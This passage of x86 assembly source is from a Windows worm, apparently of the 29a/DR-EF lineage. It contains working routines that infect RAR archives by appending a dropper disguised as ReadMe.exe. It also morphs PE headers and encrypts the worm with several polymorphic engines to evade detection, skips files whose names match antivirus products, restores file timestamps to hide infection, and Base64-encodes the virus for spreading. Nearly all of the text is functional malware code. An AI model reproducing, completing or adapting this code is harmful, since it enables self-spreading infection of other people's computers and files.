	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFileTime]
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
	ret
	
OpenFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OpenFileErr
	mov	dword ptr [ebp + hfile],eax
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + GetFileTime]
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	FileSizeErr
	mov	dword ptr [ebp + hmap],eax
	xor	eax,eax
	push	eax	
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	MapFileErr
	mov	dword ptr [ebp + mapbase],eax
	stc
	ret
MapFileErr:
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
FileSizeErr:
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
OpenFileErr:
	clc
	ret

	hmap			dd	0
	mapbase			dd	0
	CreationTime		dq	0
	LastAccessTime		dq	0
	LastWriteTime		dq	0
	hfile			dd	0
	FileSize		dd	0

RemoveFileAttributes:
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + GetFileAttributes]
	mov	[ebp + OldFileAttribute],eax
	push	FILE_ATTRIBUTE_NORMAL
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret
	
	OldFileAttribute	dd	0
	
RestoreFileAttributes:
	push	dword ptr [ebp + OldFileAttribute]
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret




FILE_ATTRIBUTE_READONLY		equ	1
FILE_ATTRIBUTE_HIDDEN		equ	2
FILE_ATTRIBUTE_SYSTEM		equ	4 



InfectRar:
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + rar_warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitRarInfection
ENDIF
	call	InitRandomNumber
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + MorphedWorm]
	push	eax
	call	[ebp + CreateFile]		;open the infected dropper
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitRarInfection
	mov	[ebp + hInfectedDropper],eax
	push	0h
	push	eax
	call	[ebp + GetFileSize]		;get dropper file size
	cmp	eax,0ffffffffh
	je	ExitAndCloseDropperFile
	mov	[ebp + DropperSize],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CreateFileMapping]	;create file mapping object for the dropper
	cmp	eax,0h
	je	ExitAndCloseDropperFile
	mov	[ebp + hDropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + MapViewOfFile]		;map dropper into memory
	cmp	eax,0h
	je	ExitAndCloseDropperMap
	mov	[ebp + DropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]		;open rar file
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitAndUnMapDropper
	mov	[ebp + hRarFile],eax
	xor	eax,eax
	push	eax
	mov	eax,[ebp + nFileSizeLow_]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CreateFileMapping]	;create file mapping object of the rar file
	cmp	eax,0h
	je	ExitAndCloseRarFile
	mov	[ebp + hRarMap],eax
	mov	eax,[ebp + nFileSizeLow_]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hRarMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	ExitAndCloseRarMap
	mov	[ebp + RarMap],eax
	cmp	dword ptr [eax],"!raR"		;is rar file ?
	jne	RarFileInfectionErr
	cmp	byte ptr [eax + 0fh],1h		;is already infected ?
	je	RarFileInfectionErr
	xor	eax,eax
	mov	edx,[ebp + DropperMap]
	mov	ecx,[ebp + DropperSize]
	call	xcrc32				;get infected dropper crc32 checksum
	mov	dword ptr [ebp + FILE_CRC],eax	;set it insaid rar header
	mov	eax,dword ptr [ebp + ftCreationTime_ + 4]
	mov	dword ptr [ebp + FTIME],eax	;set random time\data
	pushad
	mov	ecx,6h
	lea	edi,[ebp + FileInsaidRar]
@RandLetterx:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@RandLetterx			;gen random name for the infected dropper
	popad
	mov	eax,[ebp + DropperSize]
	mov	[ebp + PACK_SIZE],eax
	mov	[ebp + UNP_SIZE],eax		;set dropper size insaid of rar header
	xor	eax,eax
	lea	edx,[ebp + headcrc]
	mov	ecx,(EndRarHeader-RarHeader-2)
	call	xcrc32				;get crc32 checksum of the rar header
	mov	word ptr [ebp + HEAD_CRC],ax	;and set it in rar header
	lea	esi,[ebp + RarHeader]
	mov	edi,[ebp + RarMap]
	add	edi,[ebp + nFileSizeLow_]
	sub	edi,7h				;overwrite rar file sign
	push	edi
	mov	ecx,RarHeaderSize
	rep	movsb				;write the rar header into rar file
	mov	esi,[ebp + DropperMap]
	pop	edi
	add	edi,RarHeaderSize
	mov	ecx,[ebp + DropperSize]
	rep	movsb				;write the infected dropper into rar file
	mov	eax,[ebp + RarMap]
	push	eax
	inc	byte ptr [eax + 0fh]		;mark the rar file as infected(0fh=reserved1)
	mov	edx,eax
	xor	eax,eax
	add	edx,9h
	mov	ecx,0bh
	call	xcrc32				;get crc32 of the rar main header
	pop	ebx
	mov	word ptr [ebx + 7h],ax		;[ebx + 7h]=HEAD_CRC
ExitAndUnMapRarFile:
	push	[ebp + RarMap]
	call	[ebp + UnMapViewOfFile]
ExitAndCloseRarMap:
	push	dword ptr [ebp + hRarMap]
	call	[ebp + CloseHandle]
ExitAndCloseRarFile:
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CloseHandle]
ExitAndUnMapDropper:
	push	dword ptr [ebp + DropperMap]	
	call	[ebp + UnMapViewOfFile]
ExitAndCloseDropperMap:
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + CloseHandle]
ExitAndCloseDropperFile:
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CloseHandle]
ExitRarInfection:
	ret
RarFileInfectionErr:
	push	FILE_BEGIN
	push	0h
	push	dword ptr [ebp + nFileSizeLow_]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetEndOfFile]
	jmp	ExitAndUnMapRarFile
	
	

	hInfectedDropper	dd	0
	DropperSize		dd	0
	hDropperMap		dd	0
	DropperMap		dd	0
	hRarFile		dd	0
	hRarMap			dd	0
	RarMap			dd	0
	
	PAGE_READONLY		equ	00000002h
	FILE_MAP_READ		equ	00000004h
	FILE_BEGIN		equ	0
	
RarHeader:
		HEAD_CRC	dw	0h
	headcrc:HEAD_TYPE	db	74h
		HEAD_FLAGS	dw	8000h	;normal flag
		HEAD_SIZE	dw	RarHeaderSize
		PACK_SIZE	dd	0h
		UNP_SIZE	dd	0h
		HOST_OS		db	0h	;Ms-Dos
		FILE_CRC	dd	0h
		FTIME		dd	0h
		UNP_VER		db	14h
		METHOD		db	30h	;storing
		NAME_SIZE	dw	0ah	;file name size
	endhcrc:ATTR		dd	0h
	FileInsaidRar	equ	$
		FILE_NAME	db	"ReadMe.exe"
	EndRarHeader:
RarHeaderSize	equ	($-RarHeader)	

IF	DEBUG
	rar_warning	db "Rar File Infection!",0
ENDIF
	
	
;(c) z0mbie/29a crc32 function
; input:  EDX=data, ECX=size, EAX=crc
; output: EAX=crc, EDX+=ECX, ECX=BL=0
xcrc32:	jecxz   @@4			
	not     eax
@@1:	xor     al, [edx]
	inc     edx
	mov     bl, 8
@@2:	shr     eax, 1
	jnc     @@3
	xor     eax, 0EDB88320h
@@3:	dec     bl
	jnz     @@2
	loop    @@1
	not     eax
@@4:	ret	
	


GenMorphedWorm:

	push	0ffh
	lea	edx,[ebp + RunningWorm]
	push	edx
	push	0
	call	[ebp + GetModuleFileName]			;get worm file
	or	eax,eax
	je	GMW_Fail
	
	lea	edx,[ebp + MorphedWorm]
	push	edx
	push	0ffh
	call	[ebp + GetTempPath]				;get the temp directory path
	or	eax,eax
	je	GMW_Fail
		
	lea	edi,[ebp + MorphedWorm]
SNB:	cmp	byte ptr [edi],0h
	je	GTFN
	inc	edi
	jmp	SNB					;seek till 0 byte found
	
GTFN:	call	InitRandomNumber
	mov	ecx,6h
@RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@RandLetter				;gen random file name
	mov	byte ptr [edi],'.'
	inc	edi
	mov	ecx,3h
@xRandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@xRandLetter				;gen random file suffix
		

	xor	eax,eax
	
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	edx,[ebp + RunningWorm]
	push	edx
	call	[ebp + CreateFile]
	
	cmp	eax,INVALID_HANDLE_VALUE
	je	GMW_Fail
	mov	dword ptr [ebp + RW_FileHandle],eax	;save its file handle
	
	push	0
	push	eax
	call	[ebp + GetFileSize]			;get running worm size
	cmp	eax,INVALID_HANDLE_VALUE
	je	GMW_F_CloseRWF
	mov	dword ptr [ebp + RW_FileSize],eax	;save worm size
		
	push	eax
	add	dword ptr [esp],400h			;add 1k for safty
	push	GPTR
	call	[ebp + GlobalAlloc]			;allocate memory to store the running worm
	or	eax,eax
	je	GMW_F_CloseRWF
	mov	[ebp + MorphWorkBuffer],eax
	
	mov	[ebp + MWB_XBytes],0
	
	push	0h

	lea	edx,[ebp + MWB_XBytes]
	push	edx
	push	[ebp + RW_FileSize]
	push	eax
	push	[ebp + RW_FileHandle]
	call	[ebp + ReadFile]			;read worm into memory
	or	eax,eax
	je	GMW_F_FreeMem
	
	
	;morph pe header
	;********************************
		
	mov	ebx,[ebp + MorphWorkBuffer]
	add	ebx,[ebx + 3ch]				;goto pe header
	call	GenRandomNumber
	mov	dword ptr [ebx + 8h],eax		;set random time stamp
	call	GenRandomNumber
	mov	dword ptr [ebx + 10h],eax		;set number of symbols
	call	GenRandomNumber
	mov	word ptr [ebx + 1ah],ax			;set linker version
	call	GenRandomNumber
	mov	dword ptr [ebx + 70h],eax		;set loader flags
	call	GenRandomNumber
	mov	dword ptr [ebx + 2ch],eax		;set base of code
	call	GenRandomNumber
	mov	dword ptr [ebx + 4ch],eax		;set reserverd
	call	GenRandomNumber
	mov	dword ptr [ebx + 44h],eax		;set image version
	call	GenRandomNumber
	mov	dword ptr [ebx + 58h],eax		;set checksum
	call	GenRandomNumber
	mov	dword ptr [ebx + 40h],eax		;set OS
	movzx	ecx,word ptr [ebx + 6h]			;get number of sections
	mov	edx,[ebx + 74h]
	shl	edx,3h
	add	ebx,edx
	add	ebx,78h
	
	push	ebx					;save first section header
	
@nexts:	mov	edi,ebx
	push	ecx
	mov	ecx,8h
@Rndsec:call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@Rndsec					;gen random section name
	pop	ecx
	add	ebx,28h
	loop	@nexts					;next section	
	
	
	;zero data & code sections
	;*************************
	
	pop	ebx					;restore first section header
	

	mov	edi,[ebp + MorphWorkBuffer]
	add	edi,[ebx + 14h]
	mov	[ebp + WhereToWriteDecryptor],edi	;used for VPE
	
	mov	edi,[ebp + MorphWorkBuffer]		;get base address	
	mov	ecx,[ebx + 10h]				;get size of raw data
	xor	eax,eax
	add	edi,[ebx + 14h]				;get starting offset of section
	rep	stosb					;delete the contect of code section
		
	add	ebx,28h					;move to next data section
	
	pushad
	mov	edi,[ebp + MorphWorkBuffer]
	add	edi,[edi + 3ch]
	mov	eax,[ebx + 0ch]
	add	eax,[edi + 34h]
	
	mov	edx,[edi + 34h]
	push	dword ptr [ebx + 0ch]
	add	[esp],edx
	pop	dword ptr [ebp + CustomXDecryptPoint]	;set to virtual address
	
	
	mov	[ebp + etms_decryptor_offset],eax
	popad
	
	mov	edi,[ebp + MorphWorkBuffer]		;get base address	
	mov	ecx,data_sec_size
	xor	eax,eax
	add	edi,[ebx + 14h]				;get starting offset of section
	
	mov	[ebp + pure_virus_offset],edi
	
	rep	stosb					;delete the contect of data section
	
		
	;encrypt using bgpe
	;******************
	
	push	(VirusSizeX1+1024)
	push	GPTR
	call	[ebp + GlobalAlloc]		
	
	or	eax,eax
	je	GMW_F_CMF
	
	mov	[ebp + bgpe_morphed_worm],eax		;save buffer address
	xchg	edi,eax
	call	GenRandomNumber
	lea	esi,[ebp + virus_start]
	mov	ecx,VirusSizeX4
	call	bgpe					;morph the worm using bgpe
	
	mov	[ebp + bgpe_morphed_worm_size],eax	;save morphed worm size
	
	
	;encrypt using Etms
	;******************

	add	eax,1400h
	push	eax
	push	GPTR
	call	[ebp + GlobalAlloc]			;allocate memory to store encrypted stuff
	
	or	eax,eax
	je	GMW_F_MEM
	
	mov	[ebp + etms_morphed_worm],eax		;output buffer
		
	mov	edi,eax
	
	call	GenRandomNumber
	and	eax,714024d
	mov	[ebp + seed],eax	
	
	mov	ecx,[ebp + bgpe_morphed_worm_size]
	mov	esi,[ebp + bgpe_morphed_worm]
	

	push	ebp

	mov	ebp,[ebp + etms_decryptor_offset]
	
	
	call	etms_engine

	pop	ebp

	;copy encrypted data to the data section:
	;****************************************

	mov	esi,edi
	mov	edi,[ebp + pure_virus_offset]
	push	ecx
	push	edi
	rep	movsb
	

	;encrypt using vpe
	;******************
	
	pop	[ebp + StartOfDataToEncrypt]

	pop	eax					;size
	mov	ecx,4h
	div	ecx
	add	eax,edx					;align
	
	mov	[ebp + SizeOfDataToEncrypt],eax
	
	call	CreateDecryptor				;encrypt virus using VPE
	
	
	;free memory
	;****************
	
	push	[ebp + etms_morphed_worm]
	call	[ebp + GlobalFree]

	push	[ebp + bgpe_morphed_worm]
	call	[ebp + GlobalFree]

	;write it back to disk
	;*******************************
	
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	eax
	push	eax
	push	GENERIC_WRITE
	lea	edx,[ebp + MorphedWorm]
	push	edx
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	GMW_F_FreeMem
	mov	[ebp + MW_FileHandle],eax
	
	mov	[ebp + MWB_XBytes],0
	
	push	0
	lea	edx,[ebp + MWB_XBytes]
	push	edx
	push	[ebp + RW_FileSize]
	push	[ebp + MorphWorkBuffer]
	push	eax
	call	[ebp + WriteFile]
	or	eax,eax
	je	GMW_F_CMF
	
	push	[ebp + MW_FileHandle]
	call	[ebp + CloseHandle]
	
	push	[ebp + MorphWorkBuffer]
	call	[ebp + GlobalFree]	
	
	push	[ebp + RW_FileHandle]
	call	[ebp + CloseHandle]
	
	stc
	ret
GMW_F_MEM:
	push	[ebp + bgpe_morphed_worm]
	call	[ebp + GlobalFree]
GMW_F_CMF:	
	push	[ebp + MW_FileHandle]
	call	[ebp + CloseHandle]
GMW_F_FreeMem:
	push	[ebp + MorphWorkBuffer]
	call	[ebp + GlobalFree]
GMW_F_CloseRWF:
	push	[ebp + RW_FileHandle]
	call	[ebp + CloseHandle]
GMW_Fail:
	clc
	ret
	
	
	
	pure_virus_offset	dd	0
	
	
	etms_morphed_worm	dd	0
	etms_work_buffer	dd	0
	etms_decryptor_offset	dd	0
	
	bgpe_morphed_worm	dd	0
	bgpe_morphed_worm_size	dd	0
	

	MWB_XBytes		dd	0
	
	MorphWorkBuffer		dd	0

	RW_FileSize		dd	0
	RW_FileHandle		dd	0
	MW_FileHandle		dd	0
	RunningWorm		db	0ffh 	dup(0)
	MorphedWorm		db	0ffh	dup(0)
	

ApiNamesTable:
	
	_CreateFile		db	"CreateFileA",0
	_CloseHandle		db	"CloseHandle",0
	_CreateFileMapping	db 	"CreateFileMappingA",0
	_MapViewOfFile		db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_LoadLibrary		db	"LoadLibraryA",0
	_FreeLibrary		db	"FreeLibrary",0
	_GetModuleFileName	db	"GetModuleFileNameA",0
	_SetFileAttributesA	db	"SetFileAttributesA",0
	_GetFileSize		db	"GetFileSize",0
	_SetFilePointer		db	"SetFilePointer",0
	_SetEndOfFile		db	"SetEndOfFile",0
	_GetTickCount		db	"GetTickCount",0
	_GlobalAlloc		db	"GlobalAlloc",0
	_GlobalFree		db	"GlobalFree",0
	_GetLocalTime		db	"GetLocalTime",0
	_GetFileAttributes	db	"GetFileAttributesA",0
	_GetFileTime		db	"GetFileTime",0
	_SetFileTime		db	"SetFileTime",0
	_CreateMutexA		db	"CreateMutexA",0
	_OpenMutexA		db	"OpenMutexA",0
	_FindFirstFileA		db	"FindFirstFileA",0
	_FindNextFileA		db	"FindNextFileA",0
	_SetCurrentDirectoryA	db	"SetCurrentDirectoryA",0
	_WriteFile		db	"WriteFile",0
	_FindClose		db	"FindClose",0
	_MultiByteToWideChar	db	"MultiByteToWideChar",0
	_lstrcatA		db	"lstrcatA",0
	_CreateThread		db	"CreateThread",0
	_GetModuleHandle	db	"GetModuleHandleA",0
	_Sleep			db	"Sleep",0
	_WaitForSingleObject	db	"WaitForSingleObject",0
	_ExitThread		db	"ExitThread",0
	_ExitProcess		db	"ExitProcess",0
	_GetDriveTypeA		db	"GetDriveTypeA",0
	_GetFullPathNameA	db	"GetFullPathNameA",0
	_WinExec		db	"WinExec",0
	_VirtualProtect		db	"VirtualProtect",0
	_SetUnhandledExceptionFilter	db	"SetUnhandledExceptionFilter",0
	_DeleteFileA		db	"DeleteFileA",0
	_GetTempPathA		db	"GetTempPathA",0
	_ReadFile		db	"ReadFile",0
	_CopyFileA		db	"CopyFileA",0
	_GetWindowsDirectoryA	db	"GetWindowsDirectoryA",0
	
	
IF	DEBUG
	_OutputDebugString	db	"OutputDebugStringA",0
ENDIF
	
ApiAddressTable:
	
	CreateFile		dd	0
	CloseHandle		dd	0
	CreateFileMapping	dd	0
	MapViewOfFile		dd	0
	UnMapViewOfFile		dd	0
	LoadLibrary		dd	0
	FreeLibrary		dd	0
	GetModuleFileName	dd	0
	SetFileAttributes	dd	0
	GetFileSize		dd	0
	SetFilePointer		dd	0
	SetEndOfFile		dd	0
	GetTickCount		dd	0
	GlobalAlloc		dd	0
	GlobalFree		dd	0
	GetLocalTime		dd	0
	GetFileAttributes	dd	0
	GetFileTime		dd	0
	SetFileTime		dd	0
	CreateMutex		dd	0
	OpenMutex		dd	0
	FindFirstFile		dd	0
	FindNextFile		dd	0
	SetCurrentDirectory	dd	0
	WriteFile		dd	0
	FindClose		dd	0
	MultiByteToWideChar	dd	0
	lstrcat			dd	0
	CreateThread		dd	0
	GetModuleHandle		dd	0
	Sleep			dd	0
	WaitForSingleObject	dd	0
	ExitThread		dd	0
	ExitProcess		dd	0
	GetDriveType		dd	0
	GetFullPathName		dd	0
	WinExec			dd	0
	VirtualProtect		dd	0
	SetUnhandledExceptionFilter	dd	0
	DeleteFileA		dd	0
	GetTempPath		dd	0
	ReadFile		dd	0
	CopyFile		dd	0
	GetWindowsDirectory	dd	0
	
	
IF	DEBUG
	OutputDebugString	dd	0
ENDIF
	
	NumberOfApis		equ	44
	
	dd	0,0


	_GetProcAddress		db	"GetProcAddress",0
	__GetProcAddress	dd	0
	
;ecx - number of apis
;eax - address to api strings
;ebx - address to api address
;edx - module handle
GetNextAPI:
	push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	or	eax,eax
	je	ApiErr
	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	GetNextAPI
	stc
	ret
ApiErr:	add	esp,0ch
	clc
	ret	
	
;check if file is related to av programs or canot be infected
;input:
;esi - file name
;output:
;carry flag

CheckFileName:
	lea	esi,[ebp + FileToInfect]
	xor	ecx,ecx
@checkV:cmp	byte ptr [esi + ecx],'v'
	je	badfile
	cmp	byte ptr [esi + ecx],'V'
	je	badfile
	cmp	byte ptr [esi + ecx],0h
	je	no_v
	inc	ecx
	jmp	@checkV
no_v:	push	esi			;save file name for later use
	mov	ecx,TwoBytesNames	;scan for 2 bytes bad name
	lea	edi,[ebp + DontInfectTable]
l2:	mov	bx,word ptr [edi]
l2_1:	mov	ax,word ptr [esi]
	cmp	ax,bx
	je	ex_rs
	add	bx,2020h
	cmp	ax,bx
	je	ex_rs
	sub	bx,2020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l2_1
	mov	esi,[esp]		;restore file name	
	add	edi,2h
	loop	l2
	mov	ecx,FourBytesNames	;scan for 4 bytes bad name
	lea	edi,[ebp + DontInfectTable + (2*TwoBytesNames)]
	mov	esi,[esp]		;get file name
l3:	mov	ebx,dword ptr [edi]
l3_1:	mov	eax,dword ptr [esi]
	cmp	eax,ebx
	je	ex_rs
	add	ebx,20202020h
	cmp	eax,ebx
	je	ex_rs
	sub	ebx,20202020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l3_1
	mov	esi,[esp]
	add	edi,4h
	loop	l3
	pop	esi
	stc
	ret
ex_rs:	pop	esi
badfile:clc
	ret
	
DontInfectTable:

	db	"FP"
	db	"TB"
	db	"AW"
	db	"DR"
	db	"F-"
	TwoBytesNames	equ	5
	db	"INOC"
	db	"PAND"
	db	"ANTI"
	db	"AMON"
	db	"N32S"
	db	"NOD3"
	db	"NPSS"
	db	"SMSS"
	db	"SCAN"
	db	"ZONE"
	db	"PROT"
	db	"MONI"
	db	"RWEB"
	db	"MIRC"
	db	"CKDO"
	db	"TROJ"
	db	"SAFE"
	db	"JEDI"
	db	"TRAY"		
	db	"ANDA"	
	db	"SPID"		
	db	"PLOR"
	db	"NDLL"		
	db	"TREN"
	db	"NSPL"
	db	"NSCH"
	db	"SYST"		;dont infect files in system directory
	db	"ALER"


	FourBytesNames	equ	28	

CreateVirusBase64Image:
	push	0h
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0h
	push	FILE_SHARE_READ
	push	GENERIC_WRITE or GENERIC_READ
	cmp	byte ptr [ebp + use_rar_file],0h
	je	usexe
	lea	eax,[ebp + FileToInfect]
	jmp	__mb64
usexe:	lea	eax,[ebp + MorphedWorm]
__mb64:	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	Base64CreationErr
	mov	[ebp + hvirusfile],eax
	;get file size:
	push	0
	push	[ebp + hvirusfile]
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	CloseFileErr
	mov	[ebp + virusfilesize],eax
	push	eax
	xor	edx,edx
	mov	ecx,3h
	div	ecx
	xchg	ecx,eax
	pop	eax
	add	eax,ecx
	mov	ecx,45
	mul	ecx
	add	eax,400h	;allocate more memory than needed,just for safty
	push	eax
	push	GPTR
	call	[ebp + GlobalAlloc]	;allocate memory
	cmp	eax,0h
	je	CloseFileErr
	mov	[ebp + base64outputmem],eax
	;map file into the memory
	xor	eax,eax
	push	eax
	push	[ebp + virusfilesize]
	add	dword ptr [esp],512d
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hvirusfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	B64FreeMemErr
	mov	[ebp + hvirusmap],eax
	xor	eax,eax
	push	[ebp + virusfilesize]
	add	dword ptr [esp],512d
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	B64CloseMapErr
	mov	[ebp + hvirusinmem],eax
	xchg	eax,esi
	mov	edi,[ebp + base64outputmem]
	mov	ecx,[ebp + virusfilesize]
	call	Base64
	mov	[ebp + sizeofbase64out],eax
	push	[ebp + hvirusinmem]
	call	[ebp + UnMapViewOfFile]
	push	[ebp + hvirusmap]
	call	[ebp + CloseHandle]
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
	stc
	ret
B64CloseMapErr:
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + CloseHandle]
B64FreeMemErr:
	push	dword ptr [ebp + base64outputmem]
	call	[ebp + GlobalFree]
CloseFileErr:
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
Base64CreationErr:
	clc
	ret	

	hvirusfile	dd	0
	virusfilesize	dd	0
	base64outputmem	dd	0
	sizeofbase64out	dd	0
	hvirusmap	dd	0
	hvirusinmem	dd	0

;Base64 encoder (c) DR-EF - v2.1
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;thats the same base64 encoder that was 
;at win32.voltage with padding support
;input:
;esi - data source
;edi - where to write encoded data
;ecx - size of data to encode
;output:
;eax - size of encoded data
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Base64:	xor	edx,edx	
	push	ecx
	push	ecx
	mov	eax,ecx
	mov	ecx,3h
	div	ecx
	or	edx,edx
	jne	setr
	mov	ecx,edx
	jmp	nori
setr:	sub	ecx,edx
nori:	mov	[esp+4h],ecx
	pop	ecx
	xor	edx,edx
	push	edx
@3Bytes:push	edx
	xor	eax,eax
	xor	ebx,ebx
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	inc	esi
	push	ecx
	mov	ecx,4h
@outbit:mov	ebx,eax
	and	ebx,3fh				;leave only 6 bits
	lea	edx,[ebp + Base64Table]
	mov	bl,byte ptr [ebx + edx]
	mov	byte ptr [edi + ecx - 1h],bl
	shr	eax,6h
	loop	@outbit
	add	edi,4h
	pop	ecx
	pop	edx
	add	edx,4h	
	add	dword ptr [esp],4h
	sub	ecx,3h
	jecxz	ExitB64
	cmp	ecx,0
	jb	ExitB64
	rcl	ecx,1h
	jc	ExitB64
	rcr	ecx,1h
	cmp	edx,4ch				;did we need to add new line ?
	jne	DoLoop
	xor	edx,edx
	mov	word ptr [edi],0a0dh
	add	edi,2h
	add	dword ptr [esp],2h
DoLoop:	or	ecx,ecx
	jne	@3Bytes
ExitB64:pop	eax
	pop	ecx
	jecxz	b64out				;data is aligned by 3,all fine	
	cmp	ecx,1h
	jne	@pad2
	mov	byte ptr [edi-1h],'='
	jmp	b64out
@pad2:	mov	word ptr [edi-2h],'=='
b64out:	ret
	
Base64Table	db	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"	

;Voltage PolyMorphic Engine:
;---------------------------
;encrypt code with 4 bytes key with diffrent way each time
;and create polymorphic decryptor,the polymorphic decryptor
;has diffrent instructions that do the same thing mixed with
;junk code & anti emulation trixs


CreateDecryptor:
	call	InitRandomNumber	;init random number generator
	call	GenRandomNumber
	and	eax,1f40h		;get random numebr between 0 ~ 8000
	cmp	eax,7d0h
	ja	NextM
	mov	byte ptr [ebp + EncryptionMethod],1h ;use not
	jmp	EncryptVirus
NextM:	cmp	eax,0fa0h
	ja	NextM2
	mov	byte ptr [ebp + EncryptionMethod],2h ;use add
	jmp	EncryptVirus
NextM2:	cmp	eax,1770h
	ja	NextM3
	mov	byte ptr [ebp + EncryptionMethod],3h ;use sub
	jmp	EncryptVirus
NextM3:	mov	byte ptr [ebp + EncryptionMethod],4h ;use xor
EncryptVirus:
	call	GenRandomNumber
	mov	dword ptr [ebp + key],eax	;get random key
	xor	eax,eax
	mov	ecx,[ebp + SizeOfDataToEncrypt]		;size of data in words
	mov	edi,[ebp + StartOfDataToEncrypt]
	mov	esi,edi
@enc:	lodsd
	cmp	byte ptr [ebp + EncryptionMethod],1h	;is not	?
	jne	NextE
	not	eax
	jmp	_stosw
NextE:	cmp	byte ptr [ebp + EncryptionMethod],2h	;is add ?
	jne	NextE2
	add	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE2:	cmp	byte ptr [ebp + EncryptionMethod],3h	;is sub	?
	jne	NextE4
	sub	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE4: xor	eax,dword ptr [ebp + key]		;xor
_stosw:	stosd
	loop	@enc
	mov	edi,[ebp + WhereToWriteDecryptor]
	call	WriteJunkCode
	call	WriteInstruction2
